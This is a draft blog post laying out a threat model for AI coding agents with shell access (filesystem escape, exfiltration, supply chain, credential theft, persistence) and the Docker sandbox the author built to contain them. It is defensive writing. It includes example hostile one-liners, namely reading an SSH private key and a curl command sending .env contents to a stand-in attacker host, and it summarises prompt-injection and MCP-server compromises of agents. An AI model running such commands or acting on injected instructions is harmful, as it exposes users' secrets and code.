Title: The threat model that made me sandbox my AI agent
Date: 2026-02-21 10:00
Slug: the-threat-model-that-made-me-sandbox-my-ai-agent
Tags: security, ai, claude-code, docker, tools
Category: Security
Summary: AI coding agents have shell access to your machine. I mapped out the threats before letting one touch my code, then built Claudecker to contain them.
Status: draft

I wrote previously about [Claudecker]({filename}/running-ai-agents-in-a-box.md), my Docker wrapper for Claude Code. That post covered how it works. This one covers why I built it.

The short version: AI coding agents have shell access to your machine. They can run commands, modify files, and reach the network. I wanted to understand exactly what could go wrong before I let one anywhere near my projects.

## What you're actually running

When you launch Claude Code or Codex CLI, you're giving an LLM a terminal. Both tools have built-in safety controls. Claude Code prompts before executing shell commands, restricts file writes to the working directory, and offers an optional OS-level sandbox. Codex goes further with sandboxing enabled by default and network access disabled out of the box.

These are real protections. But they depend on user discipline. Pre-approve `Bash(*)` in your settings (common), click "allow" without reading the command (I do this constantly, because who has time to review every shell command?), or run in `bypassPermissions` mode for convenience, and you're back to an LLM with unrestricted shell access. I wanted isolation that doesn't break when someone (read: me) gets careless or clicks through a prompt on autopilot.

The problem isn't that these tools are malicious. The problem is that they're unpredictable. An LLM might run a command you didn't expect. A compromised MCP server could inject instructions. A poisoned dependency could execute code during install. The attack surface is wide and mostly unmonitored.

## The threat model

With these threats in mind, I built [Claudecker]({filename}/running-ai-agents-in-a-box.md), a shell script that wraps Docker to run Claude Code and Codex CLI in an isolated container. Point it at a project directory, and the AI agent runs inside the container with only that directory mounted. Everything else on your host is invisible to it.

It worked and I kept using it. But as I kept covering [AI security incidents in my news roundups]({filename}/your-ai-assistant-might-be-working-for-someone-else.md), I realized I should sit down and map out what Claudecker is actually protecting against. Not theoretical nation-state attacks, but realistic scenarios for a developer running AI agents daily. And I run them a lot. I try every new CLI tool, every new model, every new MCP server that shows up on my feed. I'm exactly the kind of user who needs guardrails.

Below is the threat model I came up with. The goal isn't to be exhaustive. It's to name the specific things that could go wrong when an AI agent has shell access to a developer's machine, and the ones which I was able to mitigate with Claudecker (more details in the next section).

| # | Threat | What goes wrong |
|---|--------|-----------------|
| T1 | Host filesystem escape | Agent reads files outside the project directory |
| T2 | Data exfiltration | Agent sends code or secrets to external endpoints |
| T3 | Supply chain injection | Compromised package executes on the host |
| T4 | Credential theft | Agent reads SSH keys, API tokens, cloud credentials |
| T5 | Lateral movement | Agent reaches internal network services |
| T6 | Settings persistence | Compromised session alters agent config permanently |
| T7 | Privilege escalation | Agent gains root or elevated capabilities |
| T8 | Cross-project contamination | Secrets from one project leak into another session |

### T1: Host filesystem escape

The AI operates on your project directory. But nothing stops it from reading `~/.ssh/`, `~/.aws/credentials`, `~/.env`, or any other file your user account can access. A simple `cat ~/.ssh/id_rsa` is all it takes.

This isn't hypothetical. I've seen agents wander outside the project directory during normal operation, reading system files trying to be helpful. Usually harmless. But if an agent is compromised or hallucinating, that wandering becomes dangerous. There's also the question of training data. Anything the agent reads could end up in future model training unless you've explicitly opted out.

Claude Code's own [sandboxing documentation](https://docs.anthropic.com/en/docs/claude-code/security#sandboxing) acknowledges this: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys."

### T2: Data exfiltration

An agent with network access can send your code anywhere. It could be something obvious like `curl attacker.com -d "$(cat .env)"`, or something subtle buried in a script it generates. You probably wouldn't notice either way.

This is the threat that concerns me most. Source code, API keys, environment variables, git history. All of it is readable by the agent and transmittable over the network. We've already seen this pattern with [malicious VS Code AI extensions that stole source code from 1.5 million installs]({filename}/developer-tools-are-the-new-attack-surface.md). An AI coding agent with network access is the same exfiltration vector, just with more capability.

### T3: Supply chain injection

When an agent runs `npm install` or `pip install`, it pulls packages from public registries. If one of those packages is compromised, the malicious code executes with the agent's permissions on your host. The agent didn't do anything wrong. It just installed what you asked for, and the supply chain was already poisoned.

This already happened. A [supply chain attack on Cline CLI]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) compromised the npm publish token and installed autonomous AI agents on roughly 4,000 developer machines. The attacker used prompt injection against Cline's own AI issue triage to steal the token. A [trojanized MCP server]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) deploying the StealC infostealer was another recent one.

### T4: Credential theft

SSH keys, API tokens, cloud credentials, browser cookies. Your home directory is full of secrets. An agent running on your host can read all of them. Even if the agent itself is trustworthy, a compromised skill or MCP server it loads might not be. Infostealers are already [targeting AI agent configuration files and gateway tokens]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) specifically.

### T5: Lateral movement

An agent with network access can reach anything on your local network. Other machines, internal services, databases. If you're on a corporate network, an agent is one `curl` away from touching infrastructure it has no business accessing. CrowdStrike documented how [agentic tool chain attacks]({filename}/ai-agents-under-attack.md) exploit this implicit trust to achieve code execution and data exfiltration through legitimate agent workflows.

### T6: Settings persistence

A compromised session could modify the agent's own configuration to persist across restarts. Injecting a malicious MCP server, changing allowed tool permissions, or altering default behaviors. The next time you start a session, the compromise is already there. Check Point showed that [AI assistants can be quietly repurposed as C2 channels]({filename}/your-ai-assistant-might-be-working-for-someone-else.md) using this kind of persistence. The AI does exactly what it's designed to do. It's just doing it for someone else.

### T7: Privilege escalation

If the agent can run `sudo`, the non-root user boundary means nothing. Even without explicit sudo access, there are setuid binaries and other escalation paths on most systems.

### T8: Cross-project contamination

If you're working on multiple projects, credentials from one project session shouldn't be accessible in another. But without isolation, they share the same home directory, the same SSH keys, the same environment variables.

## What Claudecker protects against

Here's how each control currently implemented in Claudecker maps to the threats above:

| Control | T1 | T2 | T3 | T4 | T5 | T6 | T7 | T8 |
|---------|----|----|----|----|----|----|----|----|
| Docker container isolation | ✅ | | | ✅ | | | | |
| Ephemeral containers (`--rm`) | | | ✅ | | | ✅ | | |
| Non-root user + scoped sudo | | | | | | | ✅ | |
| iptables allowlist firewall | | ✅ | | | ✅ | | | |
| Lockdown toggle (kill switch) | | ✅ | | | ✅ | | | |
| SSH agent forwarding (no key files) | | | | ✅ | | | | |
| Volume isolation per profile | | | | | | | | ✅ |
| Runtime settings rebuild | | | | | | ✅ | | |
| Skills hash caching | | | | | | ✅ | | |

Some of these are strong mitigations. Others are just friction. I want to be honest about which is which.

### Container isolation (mitigates T1, T4)

The most basic control. Claude Code runs inside a Docker container. The only host directory mounted is the project itself. The agent can't read `~/.ssh/` or `~/.aws/` because those paths don't exist inside the container.

```bash
./claudecker.sh run /path/to/project
```

The container runs as the unprivileged `node` user, not root. Sudo is locked down to five specific commands, all related to firewall management and SSH socket setup.

**Strength: strong.** The agent literally cannot access host files outside the mounted project directory.

**Gap:** The project directory itself is fully accessible. If you have `.env` files or secrets in your project tree, the agent can read them.

### Network firewall (mitigates T2, T3, T5)

This is the control I'm most pleased with. An iptables-based firewall that restricts outbound traffic to a whitelist of domains.

The allowlist includes only what's needed: Anthropic's API, GitHub, npm registry, PyPI, and Ubuntu package repos. Everything else is dropped. The agent can't POST your source code to an arbitrary endpoint because it can't reach arbitrary endpoints.

For sensitive work, there's a harder lockdown that kills all outbound traffic except localhost:

```bash
./claudecker.sh lockdown
```

This drops everything. The agent can still read and write code, run tests, do anything local. It just can't talk to the outside world.

**Strength: medium to strong.** The allowlist approach prevents exfiltration to arbitrary domains. The full lockdown is as close to airtight as you get without pulling the network cable.

**Gap:** The allowlist is resolved via DNS at container startup. CDN IP rotation means a domain might resolve to a new IP mid-session that gets blocked. Also, IPv6 isn't firewalled, so if the container has IPv6 connectivity, that's an open channel. I need to fix that.

### Ephemeral containers (mitigates T3, T6)

Every session starts fresh. The container is created with `--rm`, so it's destroyed on exit. Skills get reinstalled, settings get rebuilt from defaults. If a session gets compromised, the compromise dies with the container.

Settings are rebuilt at runtime by layering defaults with user overrides. The runtime file lives at `/tmp/` and is never written back to persistent storage. A compromised session can't permanently alter the configuration.

**Strength: strong for persistence prevention.** A malicious modification to settings or installed packages doesn't survive a restart.

**Gap:** The config volume (auth tokens, MCP configs) does persist. If an attacker modifies something in that volume, it carries over.

### SSH agent forwarding, not key storage (mitigates T4)

SSH private keys never touch the container filesystem. Instead, the host's SSH agent socket is mounted in, and a `socat` relay proxies it to the container's `node` user.

The agent can use the keys to authenticate (git push, git pull), but it can't read the key material. Even if the agent reads every file in the container, the private key bytes aren't there.

**Strength: strong against key theft.** The key material is genuinely inaccessible.

**Gap:** The agent socket itself still allows signing operations. A compromised session could push to any repo the key has access to. You're protecting the key, not the access.

### Profile-based volume isolation (mitigates T8)

When I set `CLAUDE_PROFILE=work`, the Docker volume storing auth tokens and configs gets a `-work` suffix. Completely separate from my personal profile. Different API keys, different git identity, different MCP servers.

```bash
CLAUDE_PROFILE=work ./claudecker.sh run /path/to/project
```

**Strength: strong.** Profiles are fully isolated at the volume level.

**Gap:** If you forget to set the profile, you're on the default volume, shared across all unprofilied sessions.

## The honest gaps

I don't want to oversell this. There are real limitations I haven't solved.

**Docker is not a VM.** Container escapes exist. Docker provides process isolation, not hardware isolation. For most threat scenarios, the friction is enough. For nation-state adversaries, it isn't. I'm okay with that trade-off for daily coding work.

**X11 mounting is a trust escalation.** Browser-based OAuth requires X11 socket forwarding. Mounting `/tmp/.X11-unix` into the container grants it potential access to keylogging and screen capture on the host display. I haven't found a better solution. Claude Code's URL-based auth flow means I rarely need it, but the mount is always there.

**No skill signature verification.** Claude Code skills are `git clone`d at runtime from GitHub. If a skill repo gets compromised, the malicious code runs inside my container on next startup. I'm trusting GitHub account security for this, which is a known weak point.

**The accumulated permissions problem.** Claude Code's own permission system (`settings.local.json`) accumulates tool approvals across sessions. Over time, the allow list grows broader than intended. `Bash(sudo:*)` sitting in my permissions file undermines the non-root user policy I set up in the container. I need to audit and reset this regularly.

## Is this paranoia or prudence?

I've covered the [growing attack surface of developer tools]({filename}/developer-tools-are-the-new-attack-surface.md) and how [AI agents themselves are becoming targets]({filename}/ai-agents-under-attack.md). The threats aren't theoretical anymore. Malicious VS Code extensions have already stolen source code from 1.5 million installs. Exposed Ollama servers are being actively exploited. LLMs have demonstrated autonomous multi-stage network attacks in research settings.

AI coding agents are the most powerful tools most developers have ever used. They're also the most privileged. I'd rather spend a few extra seconds on container startup than find out the hard way what an uncontained agent can do.

The implementation details are in the [companion post]({filename}/running-ai-agents-in-a-box.md). The [session retrospective skill]({filename}/building-a-session-retrospective-skill-for-claude-code.md) is another Claude Code workflow I built, focused on capturing lessons from each coding session.
